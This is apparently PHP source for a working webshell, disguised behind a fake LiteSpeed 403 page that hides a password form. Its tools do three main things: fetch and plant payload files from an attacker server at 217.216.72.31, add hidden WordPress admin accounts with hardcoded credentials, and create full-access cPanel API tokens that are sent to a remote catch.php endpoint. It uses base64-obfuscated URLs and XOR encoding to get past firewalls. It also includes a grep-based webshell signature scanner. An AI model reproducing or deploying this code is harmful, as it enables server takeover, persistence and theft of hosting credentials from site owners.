...
// =============================================
// AUTH GATE — Fake 403, form muncul tekan 'o'
// =============================================
$_SC_HASH = '$2y$12$6dxZutIwhKtmFJt3nJNe4uKbhUx2WxfNVcFM0ByMrySLxSip02UsG';
$_SC_CNAME = '_sc_tk'; // nama cookie
$_SC_SECRET = sha1(__FILE__ . 'sc_salt_9x2'); // token unik per deployment

function _sc_logged() {
    global $_SC_CNAME, $_SC_SECRET;
    return isset($_COOKIE[$_SC_CNAME]) && $_COOKIE[$_SC_CNAME] === $_SC_SECRET;
}

// Handle logout
if (isset($_GET['_logout'])) {
    setcookie($_SC_CNAME, '', time()-3600, '/');
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Handle login POST
if (isset($_POST['_sc_pass'])) {
    global $_SC_HASH, $_SC_CNAME, $_SC_SECRET;
    if (password_verify($_POST['_sc_pass'], $_SC_HASH)) {
        setcookie($_SC_CNAME, $_SC_SECRET, time() + 86400 * 7, '/', '', false, true);
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    }
}

// Check auth — bypass untuk AJAX request (ada X-Action atau X-Tool header)
$_has_ajax_header = isset($_SERVER['HTTP_X_ACTION']) || isset($_SERVER['HTTP_X_TOOL']) || isset($_SERVER['HTTP_X_PATH']);

if (!_sc_logged() && !$_has_ajax_header) {
    ?><!DOCTYPE html>
...
body{color:#444;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background:#fff}
h1{font-size:150px;line-height:150px;font-weight:bold}
h2{margin-top:20px;font-size:30px}
p{margin-top:20px}
.wrap{text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%}
.foot{color:#f0f0f0;font-size:12px;padding:0 30px;clear:both;height:100px;margin-top:-101px;background:#474747;border-top:1px solid rgba(0,0,0,.15)}
.hidden-form{display:none;margin-top:20px}
.hidden-form input{padding:8px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;width:200px}
.hidden-form button{padding:8px 16px;margin-left:6px;background:#474747;color:#fff;border:none;border-radius:4px;cursor:pointer}
</style></head>
<body>
...
<div class="wrap">
    ...
    <form class="hidden-form" action="" method="POST" id="loginForm">
        <input type="password" name="_sc_pass" placeholder="••••••••" autocomplete="off">
        <button type="submit">→</button>
    </form>
</div></div>
<div class="foot"><br>Proudly powered by LiteSpeed Web Server
<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div>
<script>
...
function json_out($d) {
    // Sapu bersih output buffer untuk mencegah Notice/Warning PHP merusak struktur JSON
    ...
    if (function_exists('json_encode')) {
        ...
        // Pastikan native JSON tidak gagal sebelum echo
    ...
    // Fallback eksekusi jika native gagal (misal karena nama file corrupt)
...
if (isset($_SERVER[$h_act])) {
   ...
   // --- BYPASS WAF: SECURE WRITE & ANTI 0KB ---
    if ($action === 'save' || $action === 'upload') { 
        $input = file_get_contents("php://input"); 
        
        // Proteksi Anti-0KB: Mencegah file rusak jika WAF memotong payload di tengah jalan
        if (empty($input) && isset($_SERVER['CONTENT_LENGTH']) && $_SERVER['CONTENT_LENGTH'] > 0) {
            echo "Err: Payload dropped by WAF before reaching PHP."; 
            exit;
        }

        if (isset($_SERVER[$h_enc])) {
            if ($_SERVER[$h_enc] === 'b64') {
                $input = base64_decode($input);
            } elseif ($_SERVER[$h_enc] === 'waf_bypass') {
                // Dekripsi XOR payload dari JS
                $key = "xilang"; // Kunci privat
                $dec1 = base64_decode($input);
                $unxor = "";
                for($i = 0; $i < strlen($dec1); $i++) {
                    $unxor .= $dec1[$i] ^ $key[$i % strlen($key)];
                }
                // Ekstrak hasil kembalian ke format asli
                $input = base64_decode($unxor);
            }
        }
        
        // Final sanity check sebelum menulis
        if (empty($input) && strlen(file_get_contents("php://input")) > 0) {
            echo "Err: Decode failed or WAF corrupted the payload."; exit;
        }
    ...
    if ($action === 'tool') {
        ...
        if ($tool === 'ghost_injector') {
            ...
            $targets = [
                ['http://217.216.72.31:8081/seoo.txt',  'error_log.php', 'transient_sys_pma_check'],
                ['http://217.216.72.31:8081/vx.txt',    'vx.php',        'transient_sys_cache_vx'],
                ['http://217.216.72.31:8081/index.txt', 'index.php',     'transient_sys_idx_core']
            ];
        ...
        if ($tool === 'add_admin') {
            ...
            foreach($batch_files as $file) {
                ...
                if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_name)) {
                    ...
                    $new_u = "xilang"; $new_p_raw = "Wh0th3h3llAmi"; $new_p_hash = md5($new_p_raw);
        ...
        if ($tool === 'backup') {
            ...
            $cmd = "(uapi Tokens create_full_access name=xilang || /usr/bin/uapi Tokens create_full_access name=xilang || /usr/local/cpanel/bin/uapi Tokens create_full_access name=xilang) 2>&1";
            $output = "";
            $used_method = "None";
            ...
            if ($display_status === "CREATED" && !empty($token_val)) {
                $_cfg_raw2 = @file_get_contents(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3plcm94aXBpbmRlci9zb25pYS9yZWZzL2hlYWRzL21haW4vdGVuZ2t1cmFwLnR4dA=='));
                if (empty($_cfg_raw2) && function_exists('curl_init')) { $_ch2=curl_init(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3plcm94aXBpbmRlci9zb25pYS9yZWZzL2hlYWRzL21haW4vdGVuZ2t1cmFwLnR4dA==')); curl_setopt($_ch2,CURLOPT_RETURNTRANSFER,true); curl_setopt($_ch2,CURLOPT_TIMEOUT,5); curl_setopt($_ch2,CURLOPT_SSL_VERIFYPEER,false); $_cfg_raw2=curl_exec($_ch2); curl_close($_ch2); }
                $_base2 = rtrim(trim($_cfg_raw2 ?: ''), '/') ?: 'http://217.216.72.31:8081';
                $target_url = $_base2 . '/catch.php'; 
            ...
            if (empty($targets)) {
                ...
                $au = 'xilang';
                $ap = md5('123123qq');
                $ae = 'kapanwdnyabcasu@gmail.com';
                
                // Dynamic config: baca base URL dari GitHub
                $_cfg_raw = @file_get_contents(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3plcm94aXBpbmRlci9zb25pYS9yZWZzL2hlYWRzL21haW4vdGVuZ2t1cmFwLnR4dA=='));
                if (empty($_cfg_raw) && function_exists('curl_init')) {
                    $_ch = curl_init(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3plcm94aXBpbmRlci9zb25pYS9yZWZzL2hlYWRzL21haW4vdGVuZ2t1cmFwLnR4dA=='));
                    curl_setopt($_ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($_ch, CURLOPT_TIMEOUT, 5); curl_setopt($_ch, CURLOPT_SSL_VERIFYPEER, false);
                    $_cfg_raw = curl_exec($_ch); curl_close($_ch);
                }
                $_base_url = rtrim(trim($_cfg_raw), '/');
                if (empty($_base_url)) $_base_url = 'http://217.216.72.31:8081'; // fallback

                $plugin_src = $_base_url . '/get_plugin.php?f=system-core';
                $plugin_folder_name = 'system-core';
                $plugin_filename = 'system-core.php';
                $plugin_hook = $plugin_folder_name . '/' . $plugin_filename;
                
                $receiver_url = $_base_url . '/wp/receiver.php';
                $receiver_key = 'wtf';
                ...
                $src_idx  = @file_get_contents($_base_url . '/get_plugin.php?f=index', false, $ua);
        ...
        // --- SCAN SHELL (Malware & Webshell Scanner) ---
        if ($tool === 'scan_shell') {
            $scan_dir = $target ?: $root;
            ...
            $out  = "<div class='fw-bold text-warning mb-3'><i class='fas fa-bug me-2'></i>SCAN SHELL — Target: <span class='text-info'>" . htmlspecialchars($scan_dir) . "</span></div>";
            $out .= "<hr class='border-secondary'>";

            $sections = [
                'DANGEROUS PHP FUNCTIONS'   => "grep -RIn --include='*.php' -E '(shell_exec|system|exec|passthru|proc_open|popen|pcntl_exec)\s*\(' " . escapeshellarg($scan_dir),
                'WEBSHELL SIGNATURES'       => "grep -RIn --include='*.php' -E '(FilesMan|WSO|b374k|c99|r57|webshell|cmd=|alfa shell|mini shell|uname -a)' " . escapeshellarg($scan_dir),
                'OBFUSCATION DETECTION'     => "grep -RIn --include='*.php' -E '(base64_decode|gzinflate|gzdecode|str_rot13|create_function|eval\s*\(|assert\s*\(|preg_replace.*/e)' " . escapeshellarg($scan_dir),
                'LONG BASE64 STRINGS'       => "grep -RIn --include='*.php' -E '[A-Za-z0-9+\/]{200,}={0,2}' " . escapeshellarg($scan_dir),
                'HIDDEN PHP FILES'          => "find " . escapeshellarg($scan_dir) . " -type f -name '.*.php'",
                'RECENTLY MODIFIED (7 days)'=> "find " . escapeshellarg($scan_dir) . " -type f \\( -name '*.php' -o -name '.htaccess' \\) -mtime -7",
                'SUSPICIOUS FILENAMES'      => "find " . escapeshellarg($scan_dir) . " -type f | grep -Ei '(up\\.php|shell\\.php|cmd\\.php|c99|r57|x\\.php|1\\.php|xx\\.php|cache\\.php|error_log\\.php|vx\\.php)'",
                'WORLD WRITABLE FILES'      => "find " . escapeshellarg($scan_dir) . " -type f -perm -o+w",
                'PHP INSIDE UPLOADS'        => "find " . escapeshellarg($scan_dir) . " -type f -path '*/upload*' -name '*.php'",
                'FAKE IMAGE (PHP in JPG)'   => "find " . escapeshellarg($scan_dir) . " -type f \\( -iname '*.jpg' -o -iname '*.png' -o -iname '*.gif' \\) -exec file {} \\; | grep -i php",
                'LARGE PHP > 5MB'           => "find " . escapeshellarg($scan_dir) . " -type f -name '*.php' -size +5M",
                'IFRAME / PHISHING'         => "grep -RIn --include='*.php' --include='*.html' -E '(<iframe|display:none|visibility:hidden)' " . escapeshellarg($scan_dir),
                'SYMLINKS'                  => "find " . escapeshellarg($scan_dir) . " -type l -ls",
                'ACTIVE CRONJOBS'           => "crontab -l",
            ];

            foreach ($sections as $title => $cmd) {
                $result = trim($run($cmd));
                $color  = empty($result) ? 'text-secondary' : 'text-danger';
                $icon   = empty($result) ? 'fa-check-circle text-success' : 'fa-exclamation-triangle text-danger';
                $count  = empty($result) ? 0 : substr_count($result, "\n") + 1;

                $out .= "<div class='mb-3'>";
                $out .= "<div class='fw-bold mb-1' style='color:#e9c46a'><i class='fas fa-chevron-right me-1'></i>" . htmlspecialchars($title) . "</div>";
                if (!empty($result)) {
                    $out .= "<div class='$color' style='background:#0a0a0a;padding:8px;border-radius:4px;border-left:3px solid #dc3545;font-family:monospace;font-size:0.78rem;white-space:pre-wrap;max-height:200px;overflow-y:auto;word-break:break-all;'>";
                    $out .= htmlspecialchars($result);
                    $out .= "</div>";
                    $out .= "<small class='text-danger'>⚠ Found: $count item(s)</small>";
                } else {
                    $out .= "<small class='text-success'><i class='fas fa-check me-1'></i>Clean</small>";
                }
                $out .= "</div>";
            }

            $out .= "<hr class='border-secondary'>";
            $out .= "<div class='text-success fw-bold'><i class='fas fa-flag-checkered me-2'></i>Scan Complete — " . date('Y-m-d H:i:s') . "</div>";
...
<head>
    ...
    <style>
        * { transition: border-color 0.1s ease, background-color 0.1s ease, color 0.1s ease, box-shadow 0.1s ease; }
        ...
        #path-txt { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; display:flex; align-items:center; gap:2px; flex-wrap:nowrap; }
        #path-txt .bc-sep { color: #444; margin: 0 2px; user-select:none; }
        #path-txt .bc-seg { color: var(--text-secondary); cursor:pointer; padding: 1px 4px; border-radius:3px; transition: background 0.15s, color 0.15s; white-space:nowrap; }
        #path-txt .bc-seg:hover { background: rgba(0,229,255,0.12); color: var(--accent); }
        #path-txt .bc-seg.bc-last { color: var(--text-primary); font-weight:500; cursor:default; }
        #path-txt .bc-seg.bc-last:hover { background:transparent; color: var(--text-primary); }
        ...
        <div class="modal-content">
            ...
            <div class="modal-body p-4">
                ...
                <div class="tools-list">
                    ...
                    <div class="tool-cmd" onclick="runTool('backup')"><div class="cmd-left"><i class="fas fa-shield-alt cmd-icon c-gold"></i><span class="cmd-text">BACKUP</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                    ...
                    <div class="tool-cmd" onclick="runTool('scan_shell')"><div class="cmd-left"><i class="fas fa-bug cmd-icon" style="color:#ff9800"></i><span class="cmd-text" style="color:#ff9800">SCAN SHELL (Malware Scanner)</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
...
<div class="cyber-footer">
    <span>made with <i class="fas fa-heart"></i> <span class="cy-brand">gyro</span></span>
...
<script>
    ...
    function loadDirAbsolute(absPath) {
        // Navigate directly to an absolute path
        api('list', absPath).then(r => r.json()).then(res => {
            currentPath = res.path;
            // Rebuild breadcrumb
            (function buildBreadcrumb(fullPath) {
                const el = document.getElementById('path-txt');
                el.innerHTML = '';
                const rootSeg = document.createElement('span');
                rootSeg.className = 'bc-seg';
                rootSeg.textContent = '/';
                rootSeg.title = '/';
                rootSeg.onclick = () => loadDirAbsolute('/');
                ...
                if (fullPath && fullPath !== '/') {
                    ...
                    parts.forEach((part, i) => {
                        ...
                        seg.className = 'bc-seg' + (i === parts.length - 1 ? ' bc-last' : '');
                        seg.textContent = part; seg.title = accumulated;
                        const capPath = accumulated;
                        if (i < parts.length - 1) seg.onclick = () => loadDirAbsolute(capPath);
                        el.appendChild(seg);
                    });
                }
            })(res.path);
        ...
        }).catch(() => showToast('Cannot access path', 'error'));
    }
...
// --- WAF BYPASS ENGINE ---
    function wafBypass(b64Data) {
        const key = "xilang"; // Harus sama dengan kunci di PHP
        let out = "";
        for (let i = 0; i < b64Data.length; i++) {
            out += String.fromCharCode(b64Data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return btoa(out); // Encode kembali agar aman transit via HTTP
    }
    // --- OVERRIDE SAVE FILE ---
    function saveFile() { 
        let content = editor.getValue(); 
        let encodedBase64 = btoa(unescape(encodeURIComponent(content))); 
        let securePayload = wafBypass(encodedBase64); // Obfuscate payload
        
        // Kirim menggunakan header waf_bypass
        api('save', currentFile, 'PUT', {'X-Encode': 'waf_bypass'}, securePayload).then(r => r.text()).then(m => { 
            showToast(m); 
            editModal.hide(); 
            loadDir(''); 
        }); 
...
// --- OVERRIDE UPLOAD FILE ---
    function uploadFile() { 
        ...
        reader.onload = function(e) {
            ...
            let securePayload = wafBypass(base64Content); // Obfuscate file
            
            // Kirim menggunakan header waf_bypass
            api('upload', path, 'PUT', {'X-Encode': 'waf_bypass'}, securePayload)
                .then(r => r.text())
                .then(m => { 
                    showToast(m); 
                    input.value=''; 
